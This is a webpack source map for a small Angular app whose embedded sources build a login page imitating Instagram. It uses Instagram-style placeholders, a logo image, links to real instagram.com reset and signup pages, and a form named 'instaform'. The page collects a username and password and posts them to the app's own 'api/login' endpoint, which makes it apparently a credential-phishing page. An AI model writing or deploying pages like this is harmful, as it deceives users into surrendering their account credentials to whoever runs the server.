{"version":3,"sources":["webpack:///src/environments/environment.ts","webpack:///src/app/app.component.ts","webpack:///src/app/app.component.html","webpack:///src/app/app.module.ts","webpack:///src/app/login.service.ts","webpack:///src/app/app-routing.module.ts","webpack:///src/app/login/login.component.ts","webpack:///src/app/login/login.component.html","webpack:///src/main.ts","webpack:///$_lazy_route_resource lazy namespace object"],"names":["environment","production","AppComponent","title","selector","templateUrl","styleUrls","AppModule","declarations","imports","providers","bootstrap","LoginService","http","logindata","post","subscribe","res","console","log","providedIn","routes","path","component","AppRoutingModule","forRoot","exports","LoginComponent","fb","instaform","group","required","logData","getRawValue","login","reset","log_in","bootstrapModule","err","error","webpackEmptyAsyncContext","req","Promise","resolve","then","e","Error","code","keys","module","id"],"mappings":"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","file":"main-es5.js","sourcesContent":["// This file can be replaced during build by using the `fileReplacements` array.\r\n// `ng build --prod` replaces `environment.ts` with `environment.prod.ts`.\r\n// The list of file replacements can be found in `angular.json`.\r\n\r\nexport const environment = {\r\n  production: false\r\n};\r\n\r\n/*\r\n * For easier debugging in development mode, you can import the following file\r\n * to ignore zone related error stack frames such as `zone.run`, `zoneDelegate.invokeTask`.\r\n *\r\n * This import should be commented out in production mode because it will have a negative impact\r\n * on performance if an error is thrown.\r\n */\r\n// import 'zone.js/dist/zone-error';  // Included with Angular CLI.\r\n","import { Component } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'app-root',\r\n  templateUrl: './app.component.html',\r\n  styleUrls: ['./app.component.css']\r\n})\r\nexport class AppComponent {\r\n  title = 'Mi';\r\n}\r\n","<router-outlet></router-outlet>","import { BrowserModule } from '@angular/platform-browser';\r\nimport { NgModule } from '@angular/core';\r\nimport { FormsModule, ReactiveFormsModule} from \"@angular/forms\";\r\nimport { HttpClientModule } from \"@angular/common/http\";\r\n\r\nimport { AppRoutingModule } from './app-routing.module';\r\nimport { AppComponent } from './app.component';\r\nimport { LoginComponent } from './login/login.component';\r\nimport { LoginService } from './login.service';\r\n\r\n@NgModule({\r\n  declarations: [\r\n    AppComponent,\r\n    LoginComponent\r\n  ],\r\n  imports: [\r\n    BrowserModule,\r\n    AppRoutingModule,\r\n    FormsModule,\r\n    ReactiveFormsModule,\r\n    HttpClientModule\r\n  ],\r\n  providers: [LoginService],\r\n  bootstrap: [AppComponent]\r\n})\r\nexport class AppModule { }\r\n","import { Injectable } from '@angular/core';\r\nimport { HttpClient } from '@angular/common/http';\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class LoginService {\r\n\r\n  constructor(private http:HttpClient) { }\r\n\r\n  login(logindata){\r\n    return this.http.post(\"api/login\", logindata)\r\n    .subscribe(res=>{\r\n      console.log(res);\r\n    })\r\n  }\r\n}\r\n","import { NgModule } from '@angular/core';\r\nimport { Routes, RouterModule } from '@angular/router';\r\nimport { LoginComponent } from './login/login.component';\r\n\r\nconst routes: Routes = [\r\n  {path:'',component:LoginComponent},\r\n];\r\n\r\n@NgModule({\r\n  imports: [RouterModule.forRoot(routes)],\r\n  exports: [RouterModule]\r\n})\r\nexport class AppRoutingModule { }\r\n","import { Component, OnInit } from '@angular/core';\r\nimport { FormGroup, FormBuilder, Validators} from '@angular/forms';\r\nimport { LoginService } from '../login.service';\r\n\r\n@Component({\r\n  selector: 'app-login',\r\n  templateUrl: './login.component.html',\r\n  styleUrls: ['./login.component.css']\r\n})\r\nexport class LoginComponent implements OnInit {\r\n  instaform: FormGroup;\r\n  private logData;\r\n  constructor(private fb:FormBuilder, private log:LoginService) {\r\n    this.instaform = this.fb.group({\r\n      'user':['',Validators.required],\r\n      'pass':['',Validators.required]\r\n    });\r\n}\r\n\r\n  ngOnInit(): void {\r\n  }\r\n  log_in(){\r\n    this.logData = this.instaform.getRawValue();\r\n    this.log.login(this.logData);    //Sends the data to server using angular service.\r\n    this.instaform.reset();      // This line resets the form after submission.\r\n  }\r\n}\r\n","<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\r\n\r\n<div id=\"wrapper\">\r\n  <div class=\"main-content\">\r\n    <div class=\"header\">\r\n      <img src=\"https://i.imgur.com/zqpwkLQ.png\" />\r\n    </div>\r\n    <form class=\"l-part\" [formGroup]=\"instaform\" (ngSubmit)=\"log_in()\">\r\n      <input type=\"text\" formControlName=\"user\" placeholder=\"Phone number, username, or email\" class=\"input-1\"/>\r\n      <div class=\"overlap-text\">\r\n        <input type=\"password\" formControlName=\"pass\" placeholder=\"Password\" class=\"input-2\"/>\r\n      </div>\r\n      <input type=\"submit\" value=\"Log in\" class=\"btn\" />\r\n      <div id=\"fpass\">\r\n        <a href=\"https://www.instagram.com/accounts/password/reset/\">Forgot password?</a>\r\n      </div>\r\n    </form>\r\n    <!-- <div class=\"fb\">\r\n      <a href=\"https://www.instagram.com/accounts/signup/\">\r\n        <h4>Log in with Facebook</h4>\r\n      </a>\r\n    </div> -->\r\n  </div>\r\n  <div class=\"sub-content\">\r\n    <div class=\"s-part\">\r\n      Don't have an account?<a href=\"https://www.instagram.com/accounts/emailsignup/\"> Sign up</a>\r\n    </div>\r\n  </div>\r\n</div>\r\n","import { enableProdMode } from '@angular/core';\r\nimport { platformBrowserDynamic } from '@angular/platform-browser-dynamic';\r\n\r\nimport { AppModule } from './app/app.module';\r\nimport { environment } from './environments/environment';\r\n\r\nif (environment.production) {\r\n  enableProdMode();\r\n}\r\n\r\nplatformBrowserDynamic().bootstrapModule(AppModule)\r\n  .catch(err => console.error(err));\r\n","function webpackEmptyAsyncContext(req) {\n\t// Here Promise.resolve().then() is used instead of new Promise() to prevent\n\t// uncaught exception popping up in devtools\n\treturn Promise.resolve().then(function() {\n\t\tvar e = new Error(\"Cannot find module '\" + req + \"'\");\n\t\te.code = 'MODULE_NOT_FOUND';\n\t\tthrow e;\n\t});\n}\nwebpackEmptyAsyncContext.keys = function() { return []; };\nwebpackEmptyAsyncContext.resolve = webpackEmptyAsyncContext;\nmodule.exports = webpackEmptyAsyncContext;\nwebpackEmptyAsyncContext.id = \"zn8P\";"]}